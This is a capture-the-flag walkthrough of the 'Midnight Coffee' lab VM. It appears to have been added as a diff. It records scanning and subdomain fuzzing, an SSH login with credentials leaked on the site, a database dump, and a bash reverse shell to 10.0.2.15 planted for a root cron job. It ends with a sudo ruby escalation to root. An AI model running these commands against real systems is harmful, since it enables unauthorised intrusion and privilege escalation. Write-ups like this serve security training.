@@ -1,0 +1,541 @@
+					ENUMERATION
+
+
+-----find our IP-----
+
+┌──(root㉿kali)-[/home/okina]
+└─# ifconfig
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 10.0.2.15  netmask 255.255.255.0  broadcast 10.0.2.255
+        inet6 fe80::a00:27ff:fef6:e3c3  prefixlen 64  scopeid 0x20<link>
+        ether 08:00:27:f6:e3:c3  txqueuelen 1000  (Ethernet)
+        RX packets 10008  bytes 4662729 (4.4 MiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 33190  bytes 3173434 (3.0 MiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 24  bytes 1440 (1.4 KiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 24  bytes 1440 (1.4 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+
+-----netdiscover to scan IP-range, lets see our target-----
+                                                                                
+┌──(root㉿kali)-[/home/okina]
+└─# netdiscover -i eth0 -r 10.0.2.0/24 -c 200
+ Currently scanning: Finished!   |   Screen View: Unique Hosts                                 
+                                                                                               
+ 810 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 48600                           
+ _____________________________________________________________________________
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
+ -----------------------------------------------------------------------------
+ 10.0.2.1        52:54:00:12:35:00    201   12060 s Unknown vendor                              
+ 10.0.2.2        52:54:00:12:35:00    200   12000  Unknown vendor                              
+ 10.0.2.3        08:00:27:93:fd:2e    205   12300  PCS Systemtechnik GmbH                      
+ 10.0.2.22       08:00:27:2a:fe:97    204   12240  PCS Systemtechnik GmbH                      
+
+
+-----target is 10.0.2.22, following with nmap scan-----
+                                                                        
+┌──(root㉿kali)-[/home/okina]
+└─# nmap 10.0.2.22 -sS -sC -sV -A -T4        
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-18 11:57 +03
+Nmap scan report for midnight.coffee (10.0.2.22)
+Host is up (0.00097s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 81:a4:52:2b:14:3f:13:68:2b:e2:5b:c4:7b:d7:1a:a5 (ECDSA)
+|_  256 25:19:09:29:2f:b8:ea:b4:29:1f:6d:e7:13:d6:be:7e (ED25519)
+80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
+|_http-title: Under Construction - Midnight Coffee
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+MAC Address: 08:00:27:2A:FE:97 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.8
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.97 ms midnight.coffee (10.0.2.22)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 9.10 seconds
+
+
+
+-----target's http 80 port is open, let's scan it with both dirb and gobuster to find secret pages-----                        
+                                                                              
+┌──(root㉿kali)-[/home/okina]
+└─# dirb http://10.0.2.22
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Mon Mar 18 12:00:50 2024
+URL_BASE: http://10.0.2.22/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://10.0.2.22/ ----
++ http://10.0.2.22/index.html (CODE:200|SIZE:1690)                             
++ http://10.0.2.22/server-status (CODE:403|SIZE:274)                           
+==> DIRECTORY: http://10.0.2.22/shop/                                          
+                                                                               
+---- Entering directory: http://10.0.2.22/shop/ ----
++ http://10.0.2.22/shop/index.html (CODE:200|SIZE:2577)                        
+==> DIRECTORY: http://10.0.2.22/shop/stylesheet/                               
+                                                                               
+---- Entering directory: http://10.0.2.22/shop/stylesheet/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                               
+-----------------
+END_TIME: Mon Mar 18 12:01:06 2024
+DOWNLOADED: 9224 - FOUND: 3
+
+
+                                        
+┌──(root㉿kali)-[/home/okina]
+└─# gobuster dir -u http://10.0.2.22 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,html,css,png,txt,jpg,jpeg 
+
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.0.2.22
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              jpeg,php,html,css,png,txt,jpg
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.html                (Status: 403) [Size: 274]
+/index.html           (Status: 200) [Size: 1690]
+/.php                 (Status: 403) [Size: 274]
+/shop                 (Status: 301) [Size: 305] [--> http://10.0.2.22/shop/]
+/.html                (Status: 403) [Size: 274]
+/.php                 (Status: 403) [Size: 274]
+/server-status        (Status: 403) [Size: 274]
+Progress: 1764480 / 1764488 (100.00%)
+===============================================================
+Finished
+===============================================================
+
+
+-----we find the /shop page, and the domain midnight.coffee, let's add them to /etc/hosts-----
+
+
+                                                                                                                  
+┌──(root㉿kali)-[/home/okina]
+└─# nano /etc/hosts
+
+127.0.0.1       localhost
+127.0.1.1       kali
+10.0.2.22       midnight.coffee
+
+        
+                                                                    
+
+
+-----lets run a ffuf scan to find subdomain's-----
+
+
+
+
+					SUBDOMAIN ENUMERATION
+
+
+┌──(root㉿kali)-[/home/okina]
+└─# ffuf -w wordlists/subdomains-top1million-110000.txt -u http://midnight.coffee -H 'Host: FUZZ.midnight.coffee' -fw 561
+
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://midnight.coffee
+ :: Wordlist         : FUZZ: /home/okina/wordlists/subdomains-top1million-110000.txt
+ :: Header           : Host: FUZZ.midnight.coffee
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response words: 561
+________________________________________________
+
+dev                     [Status: 200, Size: 1738, Words: 575, Lines: 72, Duration: 7ms]
+:: Progress: [114441/114441] :: Job [1/1] :: 2439 req/sec :: Duration: [0:00:49] :: Errors: 0 ::
+
+
+
+-----we find dev. subdomain, let's add to hosts-----
+
+
+┌──(root㉿kali)-[/home/okina]
+└─# nano /etc/hosts                  
+127.0.0.1	localhost
+127.0.1.1	kali
+10.0.2.22       midnight.coffee dev.midnight.coffee
+
+
+-----let's use curl to look at the subdomain-----
+
+
+                                                                                                
+┌──(root㉿kali)-[/home/okina]
+└─# curl "http://dev.midnight.coffee"
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="styles.css">
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #2a1a2d; /* Dark purple background */
+            color: #fff;
+        }
+
+        header {
+            background-color: #1a0d17; /* Dark brown header */
+            padding: 20px;
+            text-align: center;
+        }
+
+        h1 {
+            margin: 0;
+            font-size: 2em;
+            color: #ffbd59; /* Light brown heading color */
+        }
+
+        section {
+            padding: 40px 20px;
+            text-align: center;
+        }
+
+        #login-message {
+            font-size: 2.5em;
+            margin-bottom: 20px;
+            color: #ffbd59; /* Light brown text color */
+        }
+
+        footer {
+            background-color: #1a0d17; /* Dark brown footer */
+            padding: 20px;
+            text-align: center;
+            position: absolute;
+            bottom: 0;
+            width: 100%;
+        }
+
+        footer p {
+            margin: 0;
+        }
+    </style>
+    <title>Login Information - Midnight Coffee</title>
+</head>
+<body>
+    <header>
+        <h1>Midnight Coffee</h1>
+    </header>
+
+    <section>
+        <h2 id="login-message">Developer Login Information</h2>
+        <p>Developers can log in with the credentials:</p>
+        <p>Username: <strong>developer</strong></p>
+        <p>Password: <strong>developer</strong></p>
+    </section>
+
+    <footer>
+        <p>&copy; 2024 Midnight Coffee. All rights reserved.</p>
+    </footer>
+</body>
+</html>
+
+
+-----username=developer password=developer, let's use ssh to login-----
+
+
+name: tuna
+password: 1L0v3_TuN4_Very_Much
+
+
+
+
+					GAINING FOOTHOLD 
+
+                                                                                                 
+┌──(root㉿kali)-[/home/okina]
+└─# ssh tuna@10.0.2.22   
+tuna@10.0.2.22's password: 
+Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-91-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Mon Mar 18 09:27:02 AM UTC 2024
+
+  System load:  0.35400390625      Processes:               132
+  Usage of /:   52.4% of 14.01GB   Users logged in:         0
+  Memory usage: 22%                IPv4 address for enp0s3: 10.0.2.22
+  Swap usage:   0%
+
+ * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
+   just raised the bar for easy, resilient and secure K8s cluster deployment.
+
+   https://ubuntu.com/engage/secure-kubernetes-at-the-edge
+
+Expanded Security Maintenance for Applications is not enabled.
+
+117 updates can be applied immediately.
+49 of these updates are standard security updates.
+To see these additional updates run: apt list --upgradable
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+Last login: Sun Mar 17 12:50:55 2024 from 10.0.2.15
+tuna@coffee-shop:~$ 
+
+
+
+-----manuel enumeration, lets head to the /var/www/html folder-----
+
+
+tuna@coffee-shop:~$ cd /var/www/html
+tuna@coffee-shop:/var/www/html$ ls
+index.html  shop  subdomaindeveloperdirectoryuwu
+
+tuna@coffee-shop:/var/www/html$ cd shop
+tuna@coffee-shop:/var/www/html/shop$ ls
+tuna@coffee-shop:/var/www/html/shop$ cat login.php 
+
+session_start();
+
+$host = 'localhost';
+$username = 'shopadmin';
+$password = '1_4m_4dmin';
+$database = 'midnightcoffee';
+
+$mysqli = new mysqli($host, $username, $password, $database);
+
+
+
+-----mysql-----
+
+
+mysql -u shopadmin -p
+Enter password: 
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 12
+
+mysql> show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| midnightcoffee     |
+| mysql              |
+| performance_schema |
+| sys                |
++--------------------+
+5 rows in set (0.00 sec)
+
+mysql> use midnightcoffee
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql> show tables;
++--------------------------+
+| Tables_in_midnightcoffee |
++--------------------------+
+| users                    |
++--------------------------+
+1 row in set (0.00 sec)
+
+mysql> select * from users;
++----+-----------+--------------------------------------------------------------+----------------------------------+
+| id | username  | password                                                     | auth_token                       |
++----+-----------+--------------------------------------------------------------+----------------------------------+
+|  1 | shopadmin | $2a$12$yqH60OJyTqoPHXe1g1cGDu93me1v.wGcEEZV5rLy39stUJO.Xsjwi | NULL                             |
+|  2 | tuna      | 1L0v3_TuN4_Very_Much                                         | NULL                             |
+|  3 | developer | developer                                                    | 00be2a669eb227053459755bbfe85863 |
++----+-----------+--------------------------------------------------------------+----------------------------------+
+3 rows in set (0.00 sec)
+
+
+
+-----couldn't crack the admins' password hash, let's look at crontab-----
+
+
+tuna@coffee-shop:/var/www/html/shop$ cat /etc/crontab 
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+# You can also override PATH, but by default, newer versions inherit it from the environment
+#PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# Example of job definition:
+# .---------------- minute (0 - 59)
+# |  .------------- hour (0 - 23)
+# |  |  .---------- day of month (1 - 31)
+# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
+# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
+# |  |  |  |  |
+# *  *  *  *  * user-name command to be executed
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+* * * * * /bin/bash /home/shopadmin/execute.sh
+
+
+----check this location-----
+
+
+tuna@coffee-shop:/var/www/html/shop$ cat /home/shopadmin/execute.sh
+#!/bin/bash
+
+/bin/bash /tmp/*.sh
+
+
+
+----this piece of code means that it will run any sort of .sh extension within the folder /tmp without checking it's privileges, so lets place a reverse shell here then-----
+
+----lets go to revshells.com to search how to create a reverse shell in the /bin/bash/ format-----
+
+tuna@coffee-shop:/var/www/html/shop$ cd /tmp
+tuna@coffee-shop:/tmp$ nano hello.sh
+tuna@coffee-shop:/tmp$ cat hello.sh
+/bin/bash -i >& /dev/tcp/10.0.2.15/443 0>&1
+tuna@coffee-shop:/tmp$ chmod 777 hello.sh
+tuna@coffee-shop:/tmp$ ./hello.sh
+
+
+
+----open up our listener with netcat-----
+
+
+┌──(root㉿kali)-[/home/okina]
+└─# nc -nvlp 443                             
+listening on [any] 443 ...
+connect to [10.0.2.15] from (UNKNOWN) [10.0.2.22] 49568
+bash: cannot set terminal process group (2322): Inappropriate ioctl for device
+bash: no job control in this shell
+shopadmin@coffee-shop:~$ 
+
+
+tuna@coffee-shop:/tmp$ cat hello.sh 
+/bin/bash -i >& /dev/tcp/10.0.2.15/443 0>&1
+
+
+----our shell opened, we are in----
+
+
+┌──(root㉿kali)-[/home/okina]
+└─# nc -nvlp 443                             
+listening on [any] 443 ...
+connect to [10.0.2.15] from (UNKNOWN) [10.0.2.22] 49568
+bash: cannot set terminal process group (2322): Inappropriate ioctl for device
+bash: no job control in this shell
+shopadmin@coffee-shop:~$ ls
+ls
+execute.sh
+user.txt
+shopadmin@coffee-shop:~$ cat user.txt	
+cat user.txt
+----User Flag----
+
+
+
+					PRIVILEGE ESCALATION TO ADMIN
+
+
+----sudo -l to find what we can do----
+
+
+shopadmin@coffee-shop:~$ sudo -l
+sudo -l
+Matching Defaults entries for shopadmin on coffee-shop:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User shopadmin may run the following commands on coffee-shop:
+    (root) NOPASSWD: /usr/bin/ruby * /opt/shop.rb
+
+
+
+----this means that---- 
+
+NOPASSWD: shopadmin kullanıcısı, root şifresini bilmeden de belirtilen komutları çalıştırabilir
+
+/usr/bin/ruby: where the ruby tool is located at
+
+*: wildcard character, means the user can run any ruby script here
+ 
+/opt/shop.rb: where the ruby script is located at
+
+
+
+----let's go to gtfobins address to check the privilege escalation commands we can use for ruby script's----
+
+----I found this-----
+
+sudo ruby -e 'exec "/bin/sh"' 
+
+
+
+----let's run it----
+
+sudo ruby -e 'exec "/bin/sh"' /opt/shop.rb
+sudo ruby -e 'exec "/bin/sh"' /opt/shop.rb
+whoami
+root
+ls
+execute.sh
+user.txt
+cat user.txt
+
+----Root Flag-----
+
+
+
